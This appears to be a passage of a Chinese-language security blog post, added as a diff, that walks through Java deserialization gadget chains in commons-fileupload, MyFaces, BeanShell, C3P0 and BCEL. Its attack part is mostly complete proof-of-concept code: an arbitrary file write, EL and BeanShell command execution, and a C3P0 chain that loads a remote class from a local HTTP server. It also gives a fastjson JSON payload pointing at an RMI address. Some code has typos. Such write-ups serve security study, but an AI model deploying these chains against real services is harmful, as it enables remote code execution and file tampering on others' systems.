+invokeMethod:202, ReflectionUtils (org.springframework.util)
+invokeMethod:187, ReflectionUtils (org.springframework.util)
+readObject:404, SerializableTypeWrapper$MethodInvokeTypeProvider (org.springframework.core)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:606, Method (java.lang.reflect)
+invokeReadObject:1017, ObjectStreamClass (java.io)
+readSerialData:1893, ObjectInputStream (java.io)
+readOrdinaryObject:1798, ObjectInputStream (java.io)
+readObject0:1350, ObjectInputStream (java.io)
+readObject:370, ObjectInputStream (java.io)
+main:100, Spring2
+</code></pre>
+<h1 id="FileUpload"><a href="#FileUpload" class="headerlink" title="FileUpload"></a>FileUpload</h1><p>POM依赖：</p>
+<pre><code class="xml">&lt;!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;commons-fileupload&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt;
+    &lt;version&gt;1.3&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt;
+    &lt;groupId&gt;commons-io&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-io&lt;/artifactId&gt;
+    &lt;version&gt;2.4&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p><strong>Sink:</strong></p>
+<p><code>org.apache.commons.fileupload.disk.DiskFileItem#readObject</code> 可以利用这个类进行任意文件操作，读取、写入等。</p>
+<pre><code class="java">public class DiskFileItem implements FileItem &#123;  
+        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;
+        in.defaultReadObject();
+          // 输出文件路径
+        OutputStream output = this.getOutputStream();
+      
+          // 写入
+        if (this.cachedContent != null) &#123;
+            output.write(this.cachedContent);
+        &#125; else &#123;
+            FileInputStream input = new FileInputStream(this.dfosFile);
+            IOUtils.copy(input, output);
+            this.dfosFile.delete();
+            this.dfosFile = null;
+        &#125;
+
+        output.close();
+        this.cachedContent = null;
+    &#125;
+      
+          // 获取文件操作类
+      public OutputStream getOutputStream() throws IOException &#123;
+        if (this.dfos == null) &#123;
+            File outputFile = this.getTempFile();
+            this.dfos = new DeferredFileOutputStream(this.sizeThreshold, outputFile);
+        &#125;
+
+        return this.dfos;
+        &#125;
+          
+          // 获取零临时文件
+        protected File getTempFile() &#123;
+        if (this.tempFile == null) &#123;
+            File tempDir = this.repository;
+            if (tempDir == null) &#123;
+                tempDir = new File(System.getProperty(&quot;java.io.tmpdir&quot;));
+            &#125;
+
+            String tempFileName = String.format(&quot;upload_%s_%s.tmp&quot;, UID, getUniqueId());
+            this.tempFile = new File(tempDir, tempFileName);
+        &#125;
+
+        return this.tempFile;
+    &#125;
+&#125;
+</code></pre>
+<p>POC:</p>
+<pre><code class="java">import org.apache.commons.fileupload.disk.DiskFileItem;
+import org.apache.commons.io.output.DeferredFileOutputStream;
+
+import java.io.*;
+import java.lang.reflect.Field;
+
+public class FileUpload1 &#123;
+    public static void main(String[] args) throws Exception &#123;
+
+        // 创建文件写入目录 File 对象，以及文件写入内容
+        String charset = &quot;UTF-8&quot;;
+        byte[] bytes   = &quot;Hello World&quot;.getBytes(charset);
+
+        // File   repository = new File(&quot;C:\\1.txt\0&quot;);
+                File   repository = new File(&quot;C:\\&quot;)；
+          
+        // 创建 dfos 对象
+        DeferredFileOutputStream dfos = new DeferredFileOutputStream(0, repository);
+
+        // 使用 repository 初始化反序列化的 DiskFileItem 对象
+        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, repository);
+
+        // 序列化时 writeObject 要求 dfos 不能为 null
+        Field dfosFile = DiskFileItem.class.getDeclaredField(&quot;dfos&quot;);
+        dfosFile.setAccessible(true);
+        dfosFile.set(diskFileItem, dfos);
+
+        // 反射将 cachedContent 写入
+        Field field2 = DiskFileItem.class.getDeclaredField(&quot;cachedContent&quot;);
+        field2.setAccessible(true);
+        field2.set(diskFileItem, bytes);
+
+        // 模拟序列化和反序列化
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
+        outputStream.writeObject(diskFileItem);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
+        inputStream.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>根据大佬的文章无法在 1.3版本之下截断路径，只能定义目录</p>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230718102249967.png" alt="image-20230718102249967"></p>
+<h1 id="Myfaces1"><a href="#Myfaces1" class="headerlink" title="Myfaces1"></a>Myfaces1</h1><p>POM依赖：</p>
+<pre><code class="xml">&lt;!-- https://mvnrepository.com/artifact/org.apache.myfaces.core/myfaces-impl --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.myfaces.core&lt;/groupId&gt;
+    &lt;artifactId&gt;myfaces-impl&lt;/artifactId&gt;
+    &lt;version&gt;2.2.9&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;!-- https://mvnrepository.com/artifact/org.apache.myfaces.core/myfaces-api --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.myfaces.core&lt;/groupId&gt;
+    &lt;artifactId&gt;myfaces-api&lt;/artifactId&gt;
+    &lt;version&gt;2.2.9&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
+    &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;
+    &lt;version&gt;3.1.0&lt;/version&gt;
+    &lt;scope&gt;provided&lt;/scope&gt;
+&lt;/dependency&gt;
+
+&lt;!-- https://mvnrepository.com/artifact/de.odysseus.juel/juel-impl --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;
+    &lt;artifactId&gt;juel-impl&lt;/artifactId&gt;
+    &lt;version&gt;2.2.7&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;!-- https://mvnrepository.com/artifact/org.mortbay.jasper/apache-el --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.mortbay.jasper&lt;/groupId&gt;
+    &lt;artifactId&gt;apache-el&lt;/artifactId&gt;
+    &lt;version&gt;8.0.27&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;!-- https://mvnrepository.com/artifact/de.odysseus.juel/juel-api --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;
+    &lt;artifactId&gt;juel-api&lt;/artifactId&gt;
+    &lt;version&gt;2.2.7&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>Sink:</p>
+<pre><code class="java">public class ValueExpressionMethodExpression extends MethodExpression implements FacesWrapper&lt;ValueExpression&gt;, Externalizable &#123;
+    
+        public int hashCode() &#123;
+        MethodExpression me = this.getMethodExpression();
+        return me != null ? me.hashCode() : this.valueExpression.hashCode();
+    &#125;
+    private MethodExpression getMethodExpression() &#123;
+        return this.getMethodExpression(FacesContext.getCurrentInstance().getELContext());
+    &#125;
+
+    private MethodExpression getMethodExpression(ELContext context) &#123;
+          // 执行EL表达式
+        Object meOrVe = this.valueExpression.getValue(context);
+        if (meOrVe instanceof MethodExpression) &#123;
+            return (MethodExpression)meOrVe;
+        &#125; else if (!(meOrVe instanceof ValueExpression)) &#123;
+            return null;
+        &#125; else &#123;
+            while(meOrVe != null &amp;&amp; meOrVe instanceof ValueExpression) &#123;
+                meOrVe = ((ValueExpression)meOrVe).getValue(context);
+            &#125;
+
+            return (MethodExpression)meOrVe;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>POC:</p>
+<pre><code class="java">import org.apache.myfaces.context.servlet.FacesContextImpl;
+import org.apache.myfaces.context.servlet.FacesContextImplBase;
+import org.apache.myfaces.el.CompositeELResolver;
+import org.apache.myfaces.el.unified.FacesELContext;
+import org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression;
+import javax.servlet.ServletContext;
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
+
+import javax.el.ELContext;
+import javax.el.ExpressionFactory;
+import javax.el.ValueExpression;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+
+public class Myfaces1 &#123;
+    public static void main(String[] args) throws Exception&#123;
+        String payload = &quot;$&#123;1+1&#125;&quot;;
+
+        FacesContextImpl fc        = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
+        ELContext elContext = new FacesELContext(new CompositeELResolver(), fc);
+
+        // 使用反射将 elContext 写入 FacesContextImpl 中
+        Field field = FacesContextImplBase.class.getDeclaredField(&quot;_elContext&quot;);
+        field.setAccessible(true);
+        field.set(fc, elContext);
+
+        // 使用 ExpressionFactory 创建 ValueExpression
+        ExpressionFactory expressionFactory = ExpressionFactory.newInstance();
+        // 有害的 ValueExpression
+        ValueExpression valueExpression = expressionFactory.createValueExpression(elContext, payload, Object.class);
+        // 无害的 ValueExpression
+        ValueExpression harmlessExpression = expressionFactory.createValueExpression(elContext, &quot;$&#123;true&#125;&quot;, Object.class);
+
+        // 使用 ValueExpression 初始化 ValueExpressionMethodExpression
+        ValueExpressionMethodExpression expression = new ValueExpressionMethodExpression(harmlessExpression);
+
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        map.put(expression, &quot;test&quot;);
+        map.put(&quot;test&quot;, &quot;test&quot;);
+
+        // 先放入带有无害的 ValueExpression，put 到 map 之后再反射写入 valueExpression 字段避免触发
+        Field field1 = expression.getClass().getDeclaredField(&quot;valueExpression&quot;);
+        field1.setAccessible(true);
+        field1.set(expression, valueExpression);
+
+        // 模拟序列化和反序列化
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
+        outputStream.writeObject(map);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
+        inputStream.readObject();
+    &#125;
+&#125;
+</code></pre>
+<h1 id="BeanShell"><a href="#BeanShell" class="headerlink" title="BeanShell"></a>BeanShell</h1><p>BeanShell可以用来执行Java语句和表达式。</p>
+<p>POM</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.beanshell&lt;/groupId&gt;
+    &lt;artifactId&gt;bsh&lt;/artifactId&gt;
+    &lt;version&gt;2.0b5&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p><strong>Sink：</strong></p>
+<pre><code class="java">Interpreter interpreter = new Interpreter();
+String payload = &quot;myexec(poc)&quot;;
+String func = &quot;myexec(Object cmd)&#123;java.lang.Runtime.getRuntime().exec(cmd);&#125;&quot;;
+interpreter.eval(func);
+interpreter.set(&quot;poc&quot;, &quot;calc.exe&quot;);
+interpreter.eval(payload);
+</code></pre>
+<p><strong>Chain:</strong></p>
+<p><code>XThis#invokeMethod</code>提供了使用 Java 代码从 Bsh 脚本外部调用方法的功能，通过<code>XThis#invokeMethod</code>可以执行脚本</p>
+<pre><code class="java">String func = &quot;myexec(Object cmd)&#123;java.lang.Runtime.getRuntime().exec(cmd);&#125;&quot;;
+interpreter.eval(func);
+XThis xThis = new XThis(interpreter.getNameSpace(), interpreter);
+xThis.invokeMethod(&quot;myexec&quot;,new Object[]&#123;&quot;calc.exe&quot;&#125;);
+</code></pre>
+<p>而XThis中包含的Handler，<code>XThis$Handler</code> 是一个动态代理类，<code>invoke</code>方法会调用<code>invokeImpl</code>-&gt;<code>XThis.this.invokeMethod</code></p>
+<pre><code class="java">class Handler implements InvocationHandler, Serializable &#123;
+        Handler() &#123;
+        &#125;
+
+        public Object invoke(Object var1, Method var2, Object[] var3) throws Throwable &#123;
+            try &#123;
+                return this.invokeImpl(var1, var2, var3);
+            &#125; 
+              // ...
+        &#125;
+
+        public Object invokeImpl(Object var1, Method var2, Object[] var3) throws EvalError &#123;
+            String var4 = var2.getName();
+                       // ....
+
+                Class[] var8;
+                                        // ...
+                    var8 = var2.getParameterTypes();
+                      // XThis.this.invokeMethod
+                    return Primitive.unwrap(XThis.this.invokeMethod(var4, Primitive.wrap(var3, var8)));
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+</code></pre>
+<p>POC:</p>
+<pre><code class="java">import bsh.Interpreter;
+import bsh.XThis;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.util.Comparator;
+import java.util.PriorityQueue;
+
+public class BeanShell1 &#123;
+    public static void main(String[] args) throws Exception&#123;
+
+        // compare 函数，需要接受两个参数，返回 Integer 类型
+        String func=&quot;compare(Object a,Object b)&#123;new java.lang.ProcessBuilder(new String[]&#123;\&quot;calc\&quot;&#125;).start();return new Integer(1);&#125;&quot;;
+
+        // 将 compare 方法注册至 Interpreter 实例上下文中
+        Interpreter i = new Interpreter();
+        i.eval(func);
+
+        // 创建 XThis 对象，获取其 invocationHandler
+        XThis xt           = new XThis(i.getNameSpace(), i);
+        Field handlerField = XThis.class.getDeclaredField(&quot;invocationHandler&quot;);
+        handlerField.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) handlerField.get(xt);
+
+        // 使用 XThis$Handler 为 Comparator 创建动态代理
+        Comparator&lt;Object&gt; comparator = (Comparator&lt;Object&gt;) Proxy.newProxyInstance(
+                Comparator.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Comparator.class&#125;, handler);
+
+        // 在初始化时不带入 comparator
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;2&quot;);
+
+        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue, comparator);
+
+        // 模拟序列化和反序列化
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
+        outputStream.writeObject(queue);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
+        inputStream.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>调用链：</p>
+<pre><code>invokeMethod:174, This (bsh)
+invokeImpl:194, XThis$Handler (bsh)
+invoke:131, XThis$Handler (bsh)
+compare:-1, $Proxy1 (com.sun.proxy)
+siftDownUsingComparator:699, PriorityQueue (java.util)
+siftDown:667, PriorityQueue (java.util)
+heapify:713, PriorityQueue (java.util)
+readObject:773, PriorityQueue (java.util)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:606, Method (java.lang.reflect)
+invokeReadObject:1017, ObjectStreamClass (java.io)
+readSerialData:1893, ObjectInputStream (java.io)
+readOrdinaryObject:1798, ObjectInputStream (java.io)
+readObject0:1350, ObjectInputStream (java.io)
+readObject:370, ObjectInputStream (java.io)
+main:49, BeanShell1
+</code></pre>
+<h1 id="C3P0"><a href="#C3P0" class="headerlink" title="C3P0"></a>C3P0</h1><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>POM依赖：</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;com.mchange&lt;/groupId&gt;
+    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;
+    &lt;version&gt;0.9.5.2&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>PoolBackedDataSourceBase，这个类在序列化和反序列化时，要保存内部的 ConnectionPoolDataSource 成员变量，如果 connectionPoolDataSource 本身是不可序列化的对象，则使用 ReferenceIndirector 对其进行引用的封装，返回一个可以被序列化的 IndirectlySerialized 实例对象。</p>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230720103948576.png"></p>
+<p><code>ReferenceIndirector#indirectForm</code>返回<code>ReferenceSerialized</code></p>
+<pre><code class="java">    public IndirectlySerialized indirectForm(Object var1) throws Exception &#123;
+        Reference var2 = ((Referenceable)var1).getReference();
+        return new ReferenceSerialized(var2, this.name, this.contextName, this.environmentProperties);
+    &#125;
+</code></pre>
+<p><code>PoolBackedDataSourceBase#readObject</code>会调用<code>getObject</code></p>
+<pre><code class="java">    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;
+        short version = ois.readShort();
+        switch (version) &#123;
+            case 1:
+                Object o = ois.readObject();
+                if (o instanceof IndirectlySerialized) &#123;
+                    o = ((IndirectlySerialized)o).getObject();
+                &#125;
+
+                this.connectionPoolDataSource = (ConnectionPoolDataSource)o;
+                this.dataSourceName = (String)ois.readObject();
+                o = ois.readObject();
+                if (o instanceof IndirectlySerialized) &#123;
+                    o = ((IndirectlySerialized)o).getObject();
+                &#125;
+</code></pre>
+<p>而<code>com.mchange.v2.naming.ReferenceIndirector.ReferenceSerialized#getObject</code></p>
+<pre><code class="java">        public Object getObject() throws ClassNotFoundException, IOException &#123;
+            try &#123;
+                InitialContext var1;
+                if (this.env == null) &#123;
+                    var1 = new InitialContext();
+                &#125; else &#123;
+                    var1 = new InitialContext(this.env);
+                &#125;
+
+                Context var2 = null;
+                if (this.contextName != null) &#123;
+                    var2 = (Context)var1.lookup(this.contextName);
+                &#125;
+
+                return ReferenceableUtils.referenceToObject(this.reference, this.name, var2, this.env);
+</code></pre>
+<p><strong>Sink:</strong></p>
+<p><code>com.mchange.v2.naming.ReferenceableUtils#referenceToObject</code>可以通过URLClassLoader加载任意类：</p>
+<pre><code class="java">public final class ReferenceableUtils &#123;
+  
+    public static Object referenceToObject(Reference var0, Name var1, Context var2, Hashtable var3) throws NamingException &#123;
+        try &#123;
+            String var4 = var0.getFactoryClassName();
+            String var11 = var0.getFactoryClassLocation();
+            ClassLoader var6 = Thread.currentThread().getContextClassLoader();
+            if (var6 == null) &#123;
+                var6 = ReferenceableUtils.class.getClassLoader();
+            &#125;
+
+            Object var7;
+            if (var11 == null) &#123;
+                var7 = var6;
+            &#125; else &#123;
+                  // URLClassLoader
+                URL var8 = new URL(var11);
+                var7 = new URLClassLoader(new URL[]&#123;var8&#125;, var6);
+            &#125;
+
+            Class var12 = Class.forName(var4, true, (ClassLoader)var7);
+            ObjectFactory var9 = (ObjectFactory)var12.newInstance();
+            return var9.getObjectInstance(var0, var1, var2, var3);
+        &#125;
+  &#125;
+&#125;
+</code></pre>
+<p><strong>POC:</strong></p>
+<pre><code class="java">import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.sql.SQLException;
+import java.sql.SQLFeatureNotSupportedException;
+import java.util.logging.Logger;
+
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import javax.naming.Referenceable;
+import javax.sql.ConnectionPoolDataSource;
+import javax.sql.PooledConnection;
+
+import com.mchange.v2.c3p0.PoolBackedDataSource;
+import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
+
+public class C3P0_1 &#123;
+
+    private static class ConnectionPool implements ConnectionPoolDataSource , Referenceable&#123;
+
+        protected String classFactory = null;
+
+        protected String classFactoryLocation = null;
+
+        public ConnectionPool(String classFactory,String classFactoryLocation)&#123;
+            this.classFactory = classFactory;
+            this.classFactoryLocation = classFactoryLocation;
+        &#125;
+        @Override
+        public Reference getReference() throws NamingException &#123;
+            return new Reference(&quot;ref&quot;,classFactory,classFactoryLocation);
+        &#125;
+
+        @Override
+        public PooledConnection getPooledConnection() throws SQLException &#123;
+            return null;
+        &#125;
+
+        @Override
+        public PooledConnection getPooledConnection(String user, String password) throws SQLException &#123;
+            return null;
+        &#125;
+
+        @Override
+        public PrintWriter getLogWriter() throws SQLException &#123;
+            return null;
+        &#125;
+
+        @Override
+        public void setLogWriter(PrintWriter out) throws SQLException &#123;
+
+        &#125;
+
+        @Override
+        public void setLoginTimeout(int seconds) throws SQLException &#123;
+
+        &#125;
+
+        @Override
+        public int getLoginTimeout() throws SQLException &#123;
+            return 0;
+        &#125;
+
+        @Override
+        public Logger getParentLogger() throws SQLFeatureNotSupportedException &#123;
+            return null;
+        &#125;
+    &#125;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        Constructor constructor = Class.forName(&quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;).getDeclaredConstructor();
+        constructor.setAccessible(true);
+        PoolBackedDataSourceBase obj = (PoolBackedDataSourceBase) constructor.newInstance();
+
+        ConnectionPool connectionPool = new ConnectxionPool(&quot;calc&quot;,&quot;http://127.0.0.1:8888/&quot;);
+        Field field = PoolBackedDataSourceBase.class.getDeclaredField(&quot;connectionPoolDataSource&quot;);
+        field.setAccessible(true);
+        field.set(obj, connectionPool);
+
+        // 模拟序列化和反序列化
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;serialize.ser&quot;));
+        outputStream.writeObject(obj);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(&quot;serialize.ser&quot;));
+        inputStream.readObject();
+    &#125;
+&#125;
+</code></pre>
+<p>calc.java</p>
+<pre><code class="java">import java.io.IOException;
+
+public class calc &#123;
+    static&#123;
+        try &#123;
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        &#125; catch (IOException e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>调用链：</p>
+<pre><code>referenceToObject:92, ReferenceableUtils (com.mchange.v2.naming)
+getObject:118, ReferenceIndirector$ReferenceSerialized (com.mchange.v2.naming)
+readObject:211, PoolBackedDataSourceBase (com.mchange.v2.c3p0.impl)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:57, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:606, Method (java.lang.reflect)
+invokeReadObject:1017, ObjectStreamClass (java.io)
+readSerialData:1893, ObjectInputStream (java.io)
+readOrdinaryObject:1798, ObjectInputStream (java.io)
+readObject0:1350, ObjectInputStream (java.io)
+readObject:370, ObjectInputStream (java.io)
+</code></pre>
+<p><img src="/2023/07/13/Java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963/CpZO/blog/source/_posts/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%963.assets/image-20230720143009909.png" alt="image-20230720143009909"></p>
+<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p><code>com.mchange.v2.c3p0.JndiRefForwardingDataSourceBase</code></p>
+<pre><code class="json">&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;,&quot;jndiName&quot;:&quot;rmi://127.0.0.1:1099/badClassName&quot;, &quot;loginTimeout&quot;:0&#125;
+</code></pre>
+<p>JNDI的话主要利用的是<code>com.mchange.v2.c3p0.JndiRefForwardingDataSourceBase</code>中的<code>setjndiName()</code>去设置ldap地址</p>
+<pre><code class="java">public void setJndiName(Object jndiName) throws PropertyVetoException &#123;
+    Object oldVal = this.jndiName;
+    if (!this.eqOrBothNull(oldVal, jndiName)) &#123;
+        this.vcs.fireVetoableChange(&quot;jndiName&quot;, oldVal, jndiName);
+    &#125;
+
+    this.jndiName = jndiName instanceof Name ? ((Name)jndiName).clone() : jndiName;
+    if (!this.eqOrBothNull(oldVal, jndiName)) &#123;
+        this.pcs.firePropertyChange(&quot;jndiName&quot;, oldVal, jndiName);
+    &#125;
+
+&#125;
+</code></pre>
+<h2 id="Hex序列化字节加载器"><a href="#Hex序列化字节加载器" class="headerlink" title="Hex序列化字节加载器"></a>Hex序列化字节加载器</h2><p>POC:</p>
+<pre><code class="json">&#123;&quot;e&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;&#125;,&quot;f&quot;:&#123;&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:hex编码内容;&quot;&#125;&#125;
+</code></pre>
+<p>利用<code>WrapperConnectionPoolDataSource</code>的 <code>userOverridesAsString</code>调用<code>setUserOverridesAsString</code>传入以HexAsciiSerializedMap开头的字符串进行解码并触发原生反序列化</p>
+<p><code>com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</code></p>
+<pre><code class="java">    public synchronized void setUserOverridesAsString(String userOverridesAsString) throws PropertyVetoException &#123;
+        String oldVal = this.userOverridesAsString;
+        if (!this.eqOrBothNull(oldVal, userOverridesAsString)) &#123;
+            this.vcs.fireVetoableChange(&quot;userOverridesAsString&quot;, oldVal, userOverridesAsString);
+        &#125;
+
+        this.userOverridesAsString = userOverridesAsString;
+    &#125;
+</code></pre>
+<p><code>java.beans.VetoableChangeSupport#fireVetoableChange(java.beans.PropertyChangeEvent)</code></p>
+<pre><code class="java">public void fireVetoableChange(PropertyChangeEvent event)
+            throws PropertyVetoException &#123;
+                        // ....
+                    while (current &lt; listeners.length) &#123;
+                        listeners[current].vetoableChange(event);
+                        current++;
+                    &#125;
+&#125;
+</code></pre>
+<p><code>com.mchange.v2.c3p0.WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource(boolean)</code></p>
+<pre><code class="java">    public WrapperConnectionPoolDataSource(boolean autoregister) &#123;
+        super(autoregister);
+        this.connectionTester = C3P0Registry.getDefaultConnectionTester();
+        this.setUpPropertyListeners();
+
+        try &#123;
+            this.userOverrides = C3P0ImplUtils.parseUserOverridesAsString(this.getUserOverridesAsString());
+        &#125; catch (Exception var3) &#123;
+            if (logger.isLoggable(MLevel.WARNING)) &#123;
+                logger.log(MLevel.WARNING, &quot;Failed to parse stringified userOverrides. &quot; + this.getUserOverridesAsString(), var3);
+            &#125;
+        &#125;
+
+    &#125;
+</code></pre>
+<p><code>com.mchange.v2.c3p0.impl.C3P0ImplUtils#parseUserOverridesAsString</code></p>
+<pre><code class="java"> public static Map parseUserOverridesAsString(String userOverridesAsString) throws IOException, ClassNotFoundException &#123;
+        if (userOverridesAsString != null) &#123;
+            String hexAscii = userOverridesAsString.substring(&quot;HexAsciiSerializedMap&quot;.length() + 1, userOverridesAsString.length() - 1);
+            byte[] serBytes = ByteUtils.fromHexAscii(hexAscii);
+            return Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes));
+        &#125; else &#123;
+            return Collections.EMPTY_MAP;
+        &#125;
+    &#125;
+</code></pre>
+<h1 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h1><p>BCEL Classloader在 JDK &lt; 8u251之前是在rt.jar里面。<br>同时在Tomcat中也会存在相关的依赖:</p>
+<ul>
+<li>tomcat7，org.apache.tomcat.dbcp.dbcp.BasicDataSource</li>
+<li>tomcat8及其以后，org.apache.tomcat.dbcp.dbcp2.BasicDataSource</li>
+</ul>
+<blockquote>
+<p>对于SpringBoot这种自带Tomcat可以直接以单个jar文件部署的需要在maven中配置tomcat-dbcp。</p>
+</blockquote>
+<p><code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass</code></p>
+<pre><code class="java">  protected Class loadClass(String class_name, boolean resolve)
+    throws ClassNotFoundException
+  &#123;
+    Class cl = null;
+
+    /* First try: lookup hash table.
+     */
+    if((cl=(Class)classes.get(class_name)) == null) &#123;
+
+      if(cl == null) &#123;
+        JavaClass clazz = null;
+
+        /* Third try: Special request?
+         */
+        if(class_name.indexOf(&quot;$$BCEL$$&quot;) &gt;= 0)
+          // 获取class 字节数组
+          clazz = createClass(class_name);
+                
+        // ... 
+
+        if(clazz != null) &#123;
+          byte[] bytes  = clazz.getBytes();
+          // 加载类
+          cl = defineClass(class_name, bytes, 0, bytes.length);
+        &#125; else // Fourth try: Use default class loader
+          cl = Class.forName(class_name);
+      &#125;
+
+          // ...
+    return cl;
+  &#125;
+</code></pre>
+<p>跟进<code>createClass</code> 使用<code>Utility.decode</code> 对类名进行解码</p>
+<pre><code class="java">  protected JavaClass createClass(String class_name) &#123;
+    int    index     = class_name.indexOf(&quot;$$BCEL$$&quot;);
+    String real_name = class_name.substring(index + 8);
+
+    JavaClass clazz = null;
+    try &#123;
+      byte[]      bytes  = Utility.decode(real_name, true);
+      ClassParser parser = new ClassParser(new ByteArrayInputStream(bytes), &quot;foo&quot;);
+
+      clazz = parser.parse();
+    &#125; catch(Throwable e) &#123;
+      e.printStackTrace();
+      return null;
+    &#125;
+</code></pre>
+<p><code>Utility.decode</code>，读取出字节类</p>
+<pre><code class="java">public abstract class Utility &#123;
+  
+    public static byte[] decode(String s, boolean uncompress) throws IOException &#123;
+    char[] chars = s.toCharArray();
+
+    CharArrayReader car = new CharArrayReader(chars);
+    JavaReader      jr  = new JavaReader(car);
+
+    ByteArrayOutputStream bos = new ByteArrayOutputStream();
+
+    int ch;
+
+    while((ch = jr.read()) &gt;= 0) &#123;
+      bos.write(ch);
+    &#125;
+
+    bos.close();
+    car.close();
